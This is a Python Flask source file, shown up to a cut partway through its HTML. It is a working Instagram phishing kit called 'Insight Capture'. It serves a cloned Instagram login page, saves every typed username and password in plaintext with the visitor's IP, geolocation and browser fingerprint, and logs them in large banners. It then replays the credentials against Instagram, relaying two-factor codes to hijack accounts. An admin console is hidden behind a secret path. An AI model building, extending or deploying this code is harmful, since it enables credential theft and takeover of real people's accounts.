"""
Insight Capture — Instagram login clone + real account analysis + admin console.

Login is strict on purpose: the dashboard only opens when Instagram itself
confirms the credential (ok / code / approve). Timeouts, denials and account
mismatches keep the visitor on the login page — no fake dashboard.

The console is never linked from the visitor UI. Point ADMIN_PATH at a secret
slug and /admin stops existing entirely.

Env:
  SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
  ADMIN_TOKEN        console password             (unset = open, dev only)
  ADMIN_PATH         secret console slug          (default "admin" -> /admin)
  DATA_DIR           sqlite + log directory       (default ./data)
  GEO                1 to enable IP geo lookup    (default off)
  GEO_TIMEOUT        geo lookup timeout, seconds  (default 1.2)
  GEO_TTL            geo cache TTL, seconds       (default 3600)
  ANSI               0 to strip log colours       (default: on)
  PRETTY             0 to draw credential boxes instantly (default: on, animated)
  PORT               listen port                  (default 5000)
  TRUST_PROXY        trusted proxy hops           (default 1, 0 = direct)
  CLIENT_IP_HEADER   e.g. CF-Connecting-IP        (default: ProxyFix / remote_addr)
  COOKIE_SECURE      1/0                          (default: on when RENDER is set)
  LOGIN_WAIT         seconds to wait for verdict  (default 20)
  LOGIN_GRACE        extra seconds if Instagram is slow (default 10)
  IG_PROXY           residential proxy            (optional, recommended)
  IG_MAX_PEOPLE      follower/following cap       (default 3000)
"""
from __future__ import annotations

import csv
import hmac
import io
import ipaddress
import json
import logging
import os
import re
import secrets
import sqlite3
import sys
import threading
import time
import unicodedata
import urllib.request
import uuid
from collections import OrderedDict, deque
from datetime import datetime, timezone
from logging.handlers import RotatingFileHandler
from pathlib import Path
from urllib.parse import urlencode

from flask import (
    Flask,
    Response,
    abort,
    g,
    jsonify,
    redirect,
    request,
    session,
    url_for,
)
from markupsafe import escape
from werkzeug.middleware.proxy_fix import ProxyFix

import ig

# ============================== config ==============================
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
ADMIN_BASE = "/" + (os.environ.get("ADMIN_PATH", "admin").strip().strip("/") or "admin")
DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
GEO_ENABLED = os.environ.get("GEO", "0") == "1"
GEO_TIMEOUT = float(os.environ.get("GEO_TIMEOUT", "1.2"))
GEO_TTL = int(os.environ.get("GEO_TTL", "3600"))
GEO_FAIL_TTL = int(os.environ.get("GEO_FAIL_TTL", "120"))
TRUST_PROXY = int(os.environ.get("TRUST_PROXY", "1") or 0)
CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
COOKIE_MAX_AGE = 60 * 60 * 24 * 365
LOGIN_WAIT = float(os.environ.get("LOGIN_WAIT", "20"))
LOGIN_GRACE = float(os.environ.get("LOGIN_GRACE", "10"))
SYNC_MIN_INTERVAL = int(os.environ.get("SYNC_MIN_INTERVAL", "90") or 90)

# verdicts that keep the visitor on the login page (no dashboard)
DENIED_VERDICTS = ("bad_password", "bad_user", "suspended", "proxy",
                   "challenge", "rate", "session", "wrong_account")
# phases that mean Instagram accepted the credential far enough to challenge it
ACCEPTED_PHASES = ("code", "approve")

HANDLE_RE = re.compile(r"^[A-Za-z0-9._]{1,30}$")

_ansi_env = os.environ.get("ANSI")
ANSI_ON = (_ansi_env != "0" and not os.environ.get("NO_COLOR")) if _ansi_env is not None \
    else not os.environ.get("NO_COLOR")
PRETTY = os.environ.get("PRETTY", "1") != "0"

DATA_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH = DATA_DIR / "insight.sqlite3"
JSONL_PATH = DATA_DIR / "events.jsonl"


def _load_secret() -> str:
    """Env key wins; otherwise persist a generated one so restarts/workers agree."""
    env = os.environ.get("SECRET_KEY")
    if env:
        return env
    path = DATA_DIR / "secret.key"
    try:
        if path.exists():
            existing = path.read_text(encoding="utf-8").strip()
            if len(existing) >= 32:
                return existing
    except OSError:
        pass
    generated = secrets.token_hex(32)
    try:
        path.write_text(generated + "\n", encoding="utf-8")
        os.chmod(path, 0o600)
    except OSError:
        pass
    return generated


app = Flask(__name__)
app.secret_key = _load_secret()
if TRUST_PROXY > 0:
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=TRUST_PROXY, x_proto=TRUST_PROXY, x_host=TRUST_PROXY)
app.config.update(
    SESSION_COOKIE_NAME="insight_session",
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=(
        os.environ.get("COOKIE_SECURE", "1" if os.environ.get("RENDER") else "0") != "0"
    ),
    PERMANENT_SESSION_LIFETIME=COOKIE_MAX_AGE,
    MAX_CONTENT_LENGTH=512 * 1024,
    JSON_SORT_KEYS=False,
)

# ============================== logging ==============================
logger = logging.getLogger("insight")
logger.setLevel(os.environ.get("LOG_LEVEL", "INFO"))
logger.propagate = False
_fmt = logging.Formatter("%(asctime)s %(levelname)-5s %(message)s")

if not logger.handlers:
    _sh = logging.StreamHandler(sys.stdout)
    _sh.setFormatter(_fmt)
    logger.addHandler(_sh)

    _fh = RotatingFileHandler(DATA_DIR / "insight.log", maxBytes=1_000_000, backupCount=3)
    _fh.setFormatter(_fmt)
    logger.addHandler(_fh)

_jsonl_lock = threading.Lock()
_log_lock = threading.Lock()

# --- palette: named colours + a 256-colour rainbow for frames ---
C = {
    "reset": "\033[0m",
    "cred": "\033[1;33m",
    "cred_val": "\033[1;97m",
    "uval": "\033[1;96m",
    "pval": "\033[1;95m",
    "ctx": "\033[2;36m",
    "lab": "\033[1;34m",
    "meta": "\033[1;35m",
    "ok": "\033[1;32m",
    "bad": "\033[1;31m",
    "warn": "\033[1;33m",
}
# 196→226 warm sweep, 46→21 cool sweep: reads as a gradient in Render's log
RAINBOW = tuple(f"\033[1;38;5;{n}m" for n in (
    196, 202, 208, 214, 220, 226, 190, 154, 118, 82,
    46, 47, 51, 45, 39, 33, 57, 93, 129, 165, 201,
))
BOX_W = 64
_ZERO_W = "\u200d\ufe0f"


def paint(text: str, color: str) -> str:
    return f"{C.get(color, '')}{text}{C['reset']}" if ANSI_ON else text


def frame_paint(text: str, index: int, frame: str) -> str:
    if not ANSI_ON:
        return text
    if frame == "rainbow":
        return f"{RAINBOW[index % len(RAINBOW)]}{text}{C['reset']}"
    return paint(text, frame or "cred")


def _char_w(ch: str) -> int:
    if ch in _ZERO_W or unicodedata.combining(ch):
        return 0
    return 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1


def fit(text: str, width: int) -> str:
    """Truncate + pad by display width (emoji/CJK aware)."""
    out: list[str] = []
    used = 0
    for ch in str(text):
        cw = _char_w(ch)
        if used + cw > width:
            break
        out.append(ch)
        used += cw
    return "".join(out) + " " * (width - used)


def _write(line: str, draw: bool) -> None:
    with _log_lock:
        sys.stdout.write(line + "\n")
        sys.stdout.flush()
    if draw:
        time.sleep(0.012)


def print_box(title: str, lines: list, color: str = "cred",
              value_color: str = "cred_val", frame: str = "") -> None:
    """Bordered block on stdout. A line may be (text, colour) to override its colour.

    `frame="rainbow"` cycles the border through a colour sweep and draws the box
    line by line, so the Render log shows it building itself.
    """
    inner = BOX_W - 2
    draw = PRETTY and ANSI_ON
    idx = 0

    def border(text: str) -> None:
        nonlocal idx
        _write(frame_paint(text, idx, frame), draw)
        idx += 1

    border("╔" + "═" * BOX_W + "╗")
    _write(frame_paint("║ ", idx, frame) + paint(fit(title, inner), color)
           + frame_paint(" ║", idx, frame), draw)
    idx += 1
    border("╠" + "═" * BOX_W + "╣")

    for line in lines:
        text, vc = line if isinstance(line, tuple) else (line, value_color)
        _write(frame_paint("║ ", idx, frame) + paint(fit(text, inner), vc)
               + frame_paint(" ║", idx, frame), draw)
        idx += 1

    border("╚" + "═" * BOX_W + "╝")


def credential_banner(cred_id: int, source: str, username: str, password: str,
                      ip: str, place: str, ua: str, merged: bool) -> None:
    """The loud one: full colour frame, labelled fields, dim context block."""
    head = "MERGED INTO" if merged else "NEW CREDENTIAL"
    print_box(
        f"◆ {head}  ·  #{cred_id}  ·  {source.upper()}",
        [
            ("▸ USERNAME", "lab"),
            (username or "(blank)", "uval"),
            ("", "ctx"),
            ("▸ PASSWORD", "lab"),
            (password or "(blank)", "pval"),
            ("", "ctx"),
            (f"ip      {ip}", "ctx"),
            (f"place   {place}", "ctx"),
            (f"source  {source}", "ctx"),
            (f"ua      {ua[:44]}", "ctx"),
        ],
        "cred_val", "ctx", frame="rainbow",
    )


def verdict_banner(verdict: str, username: str, reason: str = "") -> None:
    if verdict == "ok":
        print_box("✔ LOGIN CONFIRMED  ·  real Instagram session",
                  [(f"user    {username}", "uval")], "ok", "ctx", frame="rainbow")
    elif verdict in DENIED_VERDICTS:
        print_box("✖ LOGIN REJECTED",
                  [(f"user    {username}", "uval"),
                   (f"reason  {(reason or verdict)[:90]}", "cred_val")], "bad", "ctx")
    elif verdict in ACCEPTED_PHASES or verdict in ("code", "approve"):
        print_box("⌛ VERIFICATION NEEDED",
                  [(f"user    {username}", "uval"),
                   ("next    code form is open on the dashboard", "ctx")], "warn", "ctx")
    else:
        print_box("… LOGIN NOT CONFIRMED YET",
                  [(f"user    {username}", "uval"),
                   ("next    press Log in again", "ctx")], "warn", "ctx")


def emit(payload: dict, banner: tuple | None = None) -> None:
    """Credential banner on stdout + one machine line in events.jsonl."""
    if banner:
        credential_banner(*banner)

    stamp = iso_now()
    body = {"ts": stamp, "kind": "CREDENTIAL", **payload}

    lines = [f"── CREDENTIAL ── {stamp}"]
    for k, v in payload.items():
        if isinstance(v, dict):
            for sk, sv in v.items():
                lines.append(f"   {sk}: {str(sv)[:200]}")
        else:
            lines.append(f"   {k}: {str(v)[:400]}")
    logger.info("\n".join(lines))

    try:
        with _jsonl_lock, JSONL_PATH.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(body, ensure_ascii=False) + "\n")
    except OSError:
        pass


# ============================== time ==============================
def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def iso_ago(seconds: int) -> str:
    return datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")


# ============================== storage ==============================
_db_lock = threading.Lock()

SCHEMA = """
CREATE TABLE IF NOT EXISTS creds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cid TEXT, sid TEXT, source TEXT, username TEXT, password TEXT,
    ip TEXT, ua TEXT, referer TEXT, accept_lang TEXT,
    meta_json TEXT, country TEXT, city TEXT, isp TEXT, geo_json TEXT,
    verdict TEXT DEFAULT '', created_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
CREATE INDEX IF NOT EXISTS idx_creds_time ON creds(created_at);

CREATE TABLE IF NOT EXISTS ig_state (
    cid TEXT PRIMARY KEY,
    username TEXT,
    phase TEXT DEFAULT 'idle',
    error TEXT DEFAULT '',
    notice TEXT DEFAULT '',
    profile_json TEXT,
    counts_json TEXT,
    lists_json TEXT,
    synced_at INTEGER DEFAULT 0,
    created_at TEXT
);
CREATE TABLE IF NOT EXISTS ig_actions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cid TEXT, kind TEXT, target TEXT, ok INTEGER, detail TEXT, created_at TEXT
);
"""

INSERT_SQL = """INSERT INTO creds
    (cid, sid, source, username, password, ip, ua, referer,
     accept_lang, meta_json, country, city, isp, geo_json, created_at)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""


def connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=15, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=15000")
    return conn


def _with_retry(fn, attempts: int = 5):
    """Retry on transient SQLite lock contention."""
    delay = 0.05
    for attempt in range(attempts):
        try:
            return fn()
        except sqlite3.OperationalError as exc:
            msg = str(exc).lower()
            if ("locked" not in msg and "busy" not in msg) or attempt == attempts - 1:
                raise
            time.sleep(delay)
            delay = min(delay * 2, 0.8)


def init_db() -> None:
    with _db_lock:
        conn = connect()
        try:
            conn.executescript(SCHEMA)
            conn.commit()
        finally:
            conn.close()


def recent_cred_id(cid: str, username: str, password: str, seconds: int = 8) -> int | None:
    conn = connect()
    try:
        row = conn.execute(
            "SELECT id FROM creds WHERE cid=? AND username=? AND password=? AND created_at>=? "
            "ORDER BY id DESC LIMIT 1",
            (cid, username, password, iso_ago(seconds)),
        ).fetchone()
        return int(row["id"]) if row else None
    finally:
        conn.close()


def set_verdict(cred_id: int, verdict: str) -> None:
    conn = connect()
    try:
        conn.execute("UPDATE creds SET verdict=? WHERE id=?", (verdict[:24], cred_id))
        conn.commit()
    finally:
        conn.close()


def current_verdict(cred_id: int) -> str:
    conn = connect()
    try:
        row = conn.execute("SELECT verdict FROM creds WHERE id=?", (cred_id,)).fetchone()
        return (row["verdict"] or "") if row else ""
    finally:
        conn.close()


def verified_login(cid: str, username: str) -> bool:
    """True only when Instagram itself confirmed this exact pair for this browser."""
    conn = connect()
    try:
        row = conn.execute(
            "SELECT 1 FROM creds WHERE cid=? AND username=? AND verdict='ok' "
            "ORDER BY id DESC LIMIT 1", (cid, username)).fetchone()
        return bool(row)
    finally:
        conn.close()


# ---------------- instagram state ----------------
def save_state(cid: str, fields: dict) -> None:
    cols: dict[str, object] = {}
    if "phase" in fields:
        cols["phase"] = fields.get("phase")
    if "error" in fields:
        cols["error"] = (fields.get("error") or "")[:400]
    if "notice" in fields:
        cols["notice"] = (fields.get("notice") or "")[:200]
    payload = fields.get("payload")
    if payload:
        cols["profile_json"] = json.dumps(payload.get("profile") or {}, ensure_ascii=False)
        cols["counts_json"] = json.dumps(payload.get("counts") or {}, ensure_ascii=False)
        cols["lists_json"] = json.dumps(payload.get("lists") or {}, ensure_ascii=False)
        cols["synced_at"] = int(payload.get("synced_at") or 0)

    conn = connect()
    try:
        conn.execute("INSERT OR IGNORE INTO ig_state (cid, username, created_at) VALUES (?,?,?)",
                     (cid, "", iso_now()))
        if cols:
            sets = ", ".join(f"{k}=?" for k in cols)
            conn.execute(f"UPDATE ig_state SET {sets} WHERE cid=?", (*cols.values(), cid))
        conn.commit()
    finally:
        conn.close()


def load_state(cid: str) -> dict:
    conn = connect()
    try:
        row = conn.execute("SELECT * FROM ig_state WHERE cid=?", (cid,)).fetchone()
    finally:
        conn.close()
    if not row:
        return {}
    return {
        "phase": row["phase"] or "idle",
        "error": row["error"] or "",
        "notice": row["notice"] or "",
        "synced_at": row["synced_at"] or 0,
        "profile": json.loads(row["profile_json"] or "{}"),
        "counts": json.loads(row["counts_json"] or "{}"),
        "lists": json.loads(row["lists_json"] or "{}"),
    }


def log_action(cid: str, kind: str, target: str, ok: bool, detail: str = "") -> None:
    conn = connect()
    try:
        conn.execute(
            "INSERT INTO ig_actions (cid, kind, target, ok, detail, created_at) VALUES (?,?,?,?,?,?)",
            (cid, kind, target[:80], 1 if ok else 0, detail[:200], iso_now()),
        )
        conn.commit()
    finally:
        conn.close()


def _ig_log(text: str, level: str = "info") -> None:
    getattr(logger, level if level in ("info", "warning", "error") else "info")(text)
    if level == "error":
        print_box("⚠ INSTAGRAM", [(text[:120], "cred_val")], "bad", "ctx")


ig.on_state = save_state
ig.on_log = _ig_log


# ============================== helpers ==============================
_rate: dict[str, deque] = {}
_rate_lock = threading.Lock()
_geo_cache: "OrderedDict[str, tuple[float, dict]]" = OrderedDict()
_geo_lock = threading.Lock()
GEO_MAX = 2000


def client_ip() -> str:
    """Real client IP. ProxyFix already normalises XFF; a custom header can override."""
    if CLIENT_IP_HEADER:
        raw = request.headers.get(CLIENT_IP_HEADER, "")
        if raw:
            return raw.split(",")[0].strip() or "-"
    return request.remote_addr or "-"


def is_private(ip: str) -> bool:
    if not ip or ip == "-":
        return True
    try:
        addr = ipaddress.ip_address(ip.split("%")[0])
    except ValueError:
        return True
    return (
        addr.is_private or addr.is_loopback or addr.is_link_local
        or addr.is_reserved or addr.is_multicast or addr.is_unspecified
    )


def rate_ok(key: str, limit: int, window: int = 60) -> bool:
    now = time.time()
    with _rate_lock:
        dq = _rate.get(key)
        if dq is None:
            dq = _rate[key] = deque()
        while dq and now - dq[0] > window:
            dq.popleft()
        if len(dq) >= limit:
            return False
        dq.append(now)
        if len(_rate) > 20_000:
            for dead in [k for k, v in _rate.items() if not v][:5000]:
                _rate.pop(dead, None)
        return True


def _geo_lookup(ip: str) -> dict:
    url = ("http://ip-api.com/json/" + ip +
           "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting")
    try:
        with urllib.request.urlopen(url, timeout=GEO_TIMEOUT) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
    except Exception:
        return {}
    return data if data.get("status") == "success" else {}


def geo(ip: str) -> dict:
    if not GEO_ENABLED or is_private(ip):
        return {}
    now = time.time()
    with _geo_lock:
        hit = _geo_cache.get(ip)
        if hit and hit[0] > now:
            _geo_cache.move_to_end(ip)
            return hit[1]

    data = _geo_lookup(ip)

    with _geo_lock:
        _geo_cache[ip] = (now + (GEO_TTL if data else GEO_FAIL_TTL), data)
        _geo_cache.move_to_end(ip)
        while len(_geo_cache) > GEO_MAX:
            _geo_cache.popitem(last=False)
    return data


def make_initials(name: str) -> str:
    parts = [p for p in name.replace("_", ".").replace("-", ".").replace(" ", ".").split(".") if p]
    return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()


def mask(secret: str) -> str:
    secret = secret or ""
    if len(secret) <= 2:
        return "*" * len(secret)
    return secret[0] + "*" * (len(secret) - 2) + secret[-1]


# ============================== auth / csrf ==============================
def admin_ok() -> bool:
    if not ADMIN_TOKEN:
        return True
    if session.get("admin"):
        return True
    tok = (request.args.get("token") or request.form.get("token")
           or request.headers.get("X-Admin-Token", ""))
    if tok and hmac.compare_digest(str(tok), ADMIN_TOKEN):
        session["admin"] = True
        return True
    return False


def csrf_token() -> str:
    tok = session.get("_csrf")
    if not tok:
        tok = secrets.token_urlsafe(24)
        session["_csrf"] = tok
    return tok


def csrf_ok() -> bool:
    sent = request.form.get("_csrf") or request.args.get("_csrf") or ""
    stored = session.get("_csrf") or ""
    return bool(sent and stored and hmac.compare_digest(sent, stored))


def html(body: str, status: int = 200) -> Response:
    return Response(body, status=status, mimetype="text/html; charset=utf-8")


def login_page(message: str = "", username: str = "", status: int = 200) -> Response:
    """Login page with an optional banner — used by every non-confirmed outcome."""
    banner = f'<div class="msg">{escape(message)}</div>' if message else ""
    page = (LOGIN_PAGE_HTML
            .replace("<!--MSG-->", banner)
            .replace("__USER__", str(escape(username))))
    return html(page, status)


# ============================== capture ==============================
def _same_account(stored_user: str, new_user: str) -> bool:
    """Typing "mah" then "mahim" is the same person; "mah" then "mahim2" is not."""
    if not stored_user or not new_user:
        return True
    return (stored_user == new_user
            or new_user.startswith(stored_user)
            or stored_user.startswith(new_user))


def capture_credential(username: str, password: str, source: str, sid: str, meta: dict) -> tuple[int, bool]:
    """Insert, or merge into a very recent partial row for the same browser.

    Returns (credential id, created). Typing "user" then "pass" normally produces
    one row instead of two, without ever overwriting a different account.
    """
    ip = client_ip()
    info = geo(ip)
    ua = (request.headers.get("User-Agent") or "")[:300]
    referer = (request.headers.get("Referer") or "")[:300]
    lang = (request.headers.get("Accept-Language") or "")[:120]
    place = ", ".join(x for x in (info.get("city"), info.get("country")) if x) or "-"
    now = iso_now()

    def _txn() -> tuple[int, bool]:
        with _db_lock:
            conn = connect()
            try:
                row = conn.execute(
                    "SELECT id, username, password FROM creds "
                    "WHERE cid=? AND created_at>=? AND (username='' OR password='') "
                    "ORDER BY id DESC LIMIT 1",
                    (g.cid, iso_ago(90)),
                ).fetchone()

                merge = False
                if row:
                    old_u = row["username"] or ""
                    old_p = row["password"] or ""
                    # same account, and no different password already stored
                    merge = _same_account(old_u, username) and (not old_p or old_p == password)

                if row and merge:
                    conn.execute(
                        "UPDATE creds SET username=?, password=?, source=?, ip=?, ua=?, referer=?, "
                        "accept_lang=?, meta_json=?, country=?, city=?, isp=?, geo_json=?, "
                        "created_at=? WHERE id=?",
                        (username, password, source[:16], ip, ua, referer, lang,
                         json.dumps(meta, ensure_ascii=False), info.get("country", "")[:64],
                         info.get("city", "")[:64], info.get("isp", "")[:96],
                         json.dumps(info, ensure_ascii=False), now, row["id"]),
                    )
                    conn.commit()
                    return int(row["id"]), False

                cur = conn.execute(INSERT_SQL, (
                    g.cid, sid[:24], source[:16], username[:200], password[:300], ip, ua,
                    referer, lang, json.dumps(meta, ensure_ascii=False),
                    info.get("country", "")[:64], info.get("city", "")[:64],
                    info.get("isp", "")[:96], json.dumps(info, ensure_ascii=False), now,
                ))
                conn.commit()
                return int(cur.lastrowid or 0), True
            finally:
                conn.close()

    cred_id, created = _with_retry(_txn)

    emit(
        {
            "id": cred_id, "op": "insert" if created else "merge", "cid": g.cid, "ip": ip,
            "source": source, "USERNAME": username, "PASSWORD": password,
            "ua": ua[:200], "referer": referer[:200],
            "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
            "fingerprint": {k: meta.get(k) for k in ("platform", "lang", "tz", "screen", "cores")
                            if meta.get(k)},
        },
        (cred_id, source, username, password, ip, place, ua, not created),
    )
    session["last_cred"] = cred_id
    return cred_id, created


# ============================== login engine glue ==============================
def start_login(cid: str, username: str, password: str) -> "ig.Job":
    """Start (or reuse) a job — a changed password always gets a fresh worker."""
    job = ig.get(cid)
    same_user = bool(job and job.username.lower() == username.lower())

    if job and same_user and job.phase == "ready":
        threading.Thread(target=job.sync, daemon=True).start()
        return job

    if job and same_user and job.alive and job.password == password:
        return job

    if job and same_user and job.alive:
        # credentials changed mid-flight: replace the worker instead of reusing it
        with ig._jobs_lock:
            if ig._jobs.get(cid) is job:
                ig._jobs.pop(cid, None)
        fresh = ig.Job(cid, username, password)
        with ig._jobs_lock:
            ig._jobs[cid] = fresh
        fresh.start()
        return fresh

    return ig.start(cid, username, password)


def account_mismatch(job: "ig.Job", typed: str) -> str:
    """Instagram username actually logged in, when it differs from what was typed."""
    if not HANDLE_RE.match(typed or ""):
        return ""  # email / phone number cannot be compared
    client = getattr(job, "cl", None)
    real = (getattr(client, "username", "") or "") if client else ""
    if real and real.lower() != typed.lower():
        return real
    return ""


def settle_verdict(job: "ig.Job", cred_id: int) -> None:
    """Persist the final verdict even when the browser has already moved on."""
    deadline = time.time() + 600
    while time.time() < deadline:
        if job.phase == "ready":
            if current_verdict(cred_id) in ("", "pending", "code"):
                set_verdict(cred_id, "ok")
            return
        if job.phase == "error" or not job.alive:
            if current_verdict(cred_id) in ("", "pending", "code"):
                set_verdict(cred_id, getattr(job, "_verdict", "") or "error")
            return
        time.sleep(1)


def mark_ok_if_ready() -> None:
    """A challenge that ended in a live session is a confirmed login."""
    cred = session.get("last_cred")
    job = ig.get(g.cid)
    if cred and job and job.phase == "ready" and current_verdict(cred) in ("", "pending", "code"):
        set_verdict(cred, "ok")


# ============================== login page ==============================
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-content">
<meta name="theme-color" content="#ffffff">

<style>
:root{
  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--blue:#0095f6;
  --ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);
  --glow:rgba(214,41,118,.13);
  --e:cubic-bezier(.22,1,.36,1);
  --spring:cubic-bezier(.2,1.5,.4,1);
}
@media (prefers-color-scheme:dark){
  :root{--bg:#000;--tx:#f5f5f5;--mut:#a8a8a8;--line:#262626;--inbg:#121212;--glow:rgba(214,41,118,.2)}
}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html{height:100%;-webkit-text-size-adjust:100%;text-size-adjust:100%}
html,body{min-height:100%}

body{
  min-height:var(--vh,100dvh);
  overflow-x:hidden;overflow-y:auto;overscroll-behavior-y:contain;
  touch-action:manipulation;
  background:var(--bg);color:var(--tx);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  display:flex;justify-content:center;align-items:stretch;
  transition:background .5s var(--e),color .5s var(--e);
}
body::before{
  content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
  background:radial-gradient(72% 55% at 50% 0,var(--glow),transparent 72%);
  animation:breathe 9s ease-in-out infinite;
}
@keyframes breathe{0%,100%{opacity:.65}50%{opacity:1}}

.app{
  position:relative;z-index:1;
  width:100%;max-width:420px;min-height:var(--vh,100dvh);
  display:flex;flex-direction:column;
  padding:calc(env(safe-area-inset-top,0px) + 10px) 24px
          calc(env(safe-area-inset-bottom,0px) + 10px);
  animation:pg .8s var(--e) both;
}

.content{
  flex:1 1 auto;min-height:0;display:flex;
  overflow-y:auto;overscroll-behavior:contain;
  scrollbar-width:none;-webkit-overflow-scrolling:touch;
  padding-bottom:14px;
}
.content::-webkit-scrollbar{display:none}
.inner{width:100%;margin:auto 0;text-align:center;padding:8px 0 16px}
.inner.shake{animation:shake .75s .1s both}

.msg{
  margin-bottom:16px;padding:10px 14px;border-radius:11px;font-size:13.5px;
  background:rgba(237,73,86,.1);color:#ed4956;border:1px solid rgba(237,73,86,.35);
  animation:drop .5s var(--spring) both;
}
@keyframes drop{from{opacity:0;transform:translateY(-10px) scale(.97)}}

.language{font-size:13px;color:var(--mut);margin-bottom:20px;animation:up .55s .06s var(--e) backwards}

.logo{width:78px;height:78px;margin:0 auto 24px;display:grid;place-items:center;animation:up .7s .12s var(--e) backwards}
.logo img{width:70px;height:70px;animation:float 5.5s ease-in-out infinite;
  filter:drop-shadow(0 6px 16px rgba(214,41,118,.28))}

.inputs{display:flex;flex-direction:column;gap:10px}

input{
  width:100%;padding:14px 13px;
  font-family:inherit;font-size:16px;line-height:1.25;color:var(--tx);
  border:1px solid var(--line);border-radius:11px;background:var(--inbg);
  -webkit-appearance:none;appearance:none;outline:none;
  transition:border-color .3s var(--e),box-shadow .4s var(--e),background .3s var(--e),
             transform .45s var(--spring),letter-spacing .3s var(--e);
}
input::placeholder{color:var(--mut);transition:opacity .3s,transform .4s var(--e)}
input:focus::placeholder{opacity:.55;transform:translateX(2px)}
input:focus{
  border-color:var(--blue);background:var(--bg);
  box-shadow:0 0 0 4px rgba(0,149,246,.14),0 12px 26px -14px rgba(0,149,246,.6);
  transform:translateY(-2px);
}
.inputs input:nth-child(1){animation:up .6s .2s var(--e) backwards}
.inputs input:nth-child(2){animation:up .6s .27s var(--e) backwards}

@keyframes autofillStart{from{}to{}}
input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}

.login-btn{
  position:relative;overflow:hidden;width:100%;margin-top:12px;padding:13px 0;
  border:0;border-radius:24px;color:#fff;
  background:linear-gradient(100deg,#0095f6,#4f5bd5 35%,#d62976 65%,#0095f6);
  background-size:260% 100%;
  font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
  box-shadow:0 6px 18px rgba(0,149,246,.3);
  transition:transform .45s var(--spring),box-shadow .4s var(--e),filter .25s,opacity .2s;
  animation:up .6s .33s var(--e) backwards, drift 9s linear infinite;
}
@keyframes drift{to{background-position:260% 0}}
.login-btn::after{
  content:"";position:absolute;top:0;left:-60%;width:45%;height:100%;
  background:linear-gradient(100deg,transparent,rgba(255,255,255,.6),transparent);
  transform:skewX(-18deg);animation:sweep 4.5s 1.4s var(--e) infinite;
}
.login-btn:hover{filter:brightness(1.07);transform:translateY(-2px) scale(1.015);box-shadow:0 14px 30px -10px rgba(214,41,118,.6)}
.login-btn:active{transform:scale(.965);box-shadow:0 4px 12px rgba(0,149,246,.28)}
.login-btn:disabled{opacity:.6;cursor:default;pointer-events:none}
.login-btn:disabled::after{animation:none}

.forgot{
  margin-top:16px;font-size:14px;color:var(--tx);cursor:pointer;
  transition:letter-spacing .35s var(--e),opacity .25s,transform .4s var(--spring);
  animation:up .6s .39s var(--e) backwards;
}
.forgot:hover{letter-spacing:.5px;opacity:.72;transform:translateY(-1px)}

.create{margin-top:26px;animation:up .6s .45s var(--e) backwards}
.create button{
  position:relative;overflow:hidden;width:100%;padding:13px 0;border-radius:24px;
  border:1px solid var(--blue);background:transparent;color:var(--blue);
  font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
  transition:background .35s var(--e),transform .45s var(--spring),box-shadow .35s var(--e);
}
.create button:hover{background:rgba(0,149,246,.08);box-shadow:0 10px 24px -12px rgba(0,149,246,.7)}
.create button:active{transform:scale(.97)}

.bottom{flex:none;position:relative;text-align:center;padding-top:6px;
  animation:up .65s .5s var(--e) backwards}
.meta{font-size:14px;color:var(--mut);display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:4px}
.meta .inf{display:inline-block;animation:pulse 3.2s ease-in-out infinite}
.footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:2px}

.rip{position:absolute;border-radius:50%;background:rgba(255,255,255,.5);transform:scale(0);
  animation:rip .65s ease-out forwards;pointer-events:none}
@keyframes rip{to{transform:scale(2.8);opacity:0}}

.scan{position:fixed;top:0;left:0;height:3px;width:0;z-index:30;opacity:0;
  background:linear-gradient(90deg,#feda75,#d62976,#4f5bd5);
  box-shadow:0 0 14px rgba(214,41,118,.9);transition:opacity .3s}
body.busy .scan{opacity:1;animation:load 2.6s cubic-bezier(.35,0,.2,1) forwards}
@keyframes load{0%{width:0}38%{width:52%}70%{width:74%}100%{width:93%}}

.veil{position:fixed;inset:0;z-index:29;display:grid;place-items:center;gap:14px;
  align-content:center;background:rgba(0,0,0,.06);backdrop-filter:blur(7px) saturate(120%);
